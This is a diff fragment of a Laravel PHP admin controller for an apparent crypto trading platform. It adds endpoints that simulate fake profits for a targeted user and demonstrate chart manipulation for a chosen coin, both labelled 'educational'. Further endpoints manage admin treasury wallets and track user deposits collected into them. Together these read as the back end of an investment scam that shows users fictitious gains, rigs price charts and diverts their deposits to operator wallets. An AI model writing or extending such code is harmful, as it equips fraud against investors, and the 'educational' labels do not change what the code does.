+            
+            $result = $tradingSimulator->simulateFakeProfitScenarios($user);
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin simulated fake profit scenarios', [
+                'admin_id' => $request->user()->id,
+                'target_user_id' => $user->id,
+                'warning' => 'This demonstrates fake profit manipulation'
+            ]);
+
+            return response()->json($result);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to simulate profit scenarios: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Demonstrate chart manipulation techniques for educational purposes
+     */
+    public function demonstrateChartManipulation(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'cryptocurrency' => 'required|string|exists:cryptocurrencies,symbol'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $tradingSimulator = app(\App\Services\EducationalTradingSimulator::class);
+            
+            $result = $tradingSimulator->demonstrateChartManipulation(
+                $request->input('cryptocurrency')
+            );
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin demonstrated chart manipulation', [
+                'admin_id' => $request->user()->id,
+                'cryptocurrency' => $request->input('cryptocurrency'),
+                'warning' => 'This demonstrates chart manipulation techniques'
+            ]);
+
+            return response()->json($result);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to demonstrate chart manipulation: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Get admin treasury wallets configuration
+     */
+    public function getAdminWallets(Request $request): JsonResponse
+    {
+        try {
+            $adminWalletService = app(AdminWalletService::class);
+            $statistics = $adminWalletService->getAdminWalletStatistics();
+            
+            return response()->json([
+                'success' => true,
+                'data' => $statistics,
+                'message' => 'Admin wallets retrieved successfully'
+            ]);
+
+        } catch (\Exception $e) {
+            Log::error('Failed to get admin wallets', [
+                'error' => $e->getMessage(),
+                'trace' => $e->getTraceAsString()
+            ]);
+
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to retrieve admin wallets'
+            ], 500);
+        }
+    }
+
+    /**
+     * Update admin wallet address
+     */
+    public function updateAdminWallet(Request $request): JsonResponse
+    {
+        try {
+            $validator = Validator::make($request->all(), [
+                'currency' => 'required|string|max:10',
+                'address' => 'required|string|max:100'
+            ]);
+
+            if ($validator->fails()) {
+                return response()->json([
+                    'success' => false,
+                    'message' => 'Validation failed',
+                    'errors' => $validator->errors()
+                ], 422);
+            }
+
+            $adminWalletService = app(AdminWalletService::class);
+            $success = $adminWalletService->updateAdminWallet(
+                $request->input('currency'),
+                $request->input('address')
+            );
+
+            if ($success) {
+                return response()->json([
+                    'success' => true,
+                    'message' => 'Admin wallet updated successfully'
+                ]);
+            } else {
+                return response()->json([
+                    'success' => false,
+                    'message' => 'Failed to update admin wallet'
+                ], 500);
+            }
+
+        } catch (\InvalidArgumentException $e) {
+            return response()->json([
+                'success' => false,
+                'message' => $e->getMessage()
+            ], 422);
+        } catch (\Exception $e) {
+            Log::error('Failed to update admin wallet', [
+                'error' => $e->getMessage(),
+                'currency' => $request->input('currency'),
+                'address' => $request->input('address')
+            ]);
+
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to update admin wallet'
+            ], 500);
+        }
+    }
+
+    /**
+     * Get deposit collection statistics
+     */
+    public function getDepositCollectionStats(Request $request): JsonResponse
+    {
+        try {
+            $adminWalletService = app(AdminWalletService::class);
+            
+            // Get deposits by type
+            $adminDeposits = DepositAddress::where('type', 'admin_treasury')
+                ->with(['user'])
+                ->count();
+                
+            $userDeposits = DepositAddress::where('type', 'user_generated')
+                ->count();
+                
+            $metamaskDeposits = DepositAddress::where('type', 'metamask')
+                ->count();
+
+            // Get recent admin wallet deposits
+            $recentAdminDeposits = Deposit::whereHas('user.depositAddresses', function($query) {
+                $query->where('type', 'admin_treasury');
+            })
+            ->with(['user'])
+            ->orderBy('created_at', 'desc')
+            ->limit(10)
+            ->get();
+
+            return response()->json([
+                'success' => true,
+                'data' => [
+                    'collection_mode' => $adminWalletService->getCollectionMode(),
+                    'admin_wallets_enabled' => $adminWalletService->isAdminWalletEnabled(),
+                    'deposit_statistics' => [
+                        'admin_treasury' => $adminDeposits,
+                        'user_generated' => $userDeposits,
+                        'metamask' => $metamaskDeposits,
+                        'total' => $adminDeposits + $userDeposits + $metamaskDeposits
+                    ],
+                    'recent_admin_deposits' => $recentAdminDeposits,
+                    'admin_wallets' => $adminWalletService->getAllAdminWallets()
+                ]
+            ]);
+
+        } catch (\Exception $e) {
+            Log::error('Failed to get deposit collection stats', [
+                'error' => $e->getMessage()
+            ]);
+
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to retrieve deposit collection statistics'
             ], 500);
         }
     }
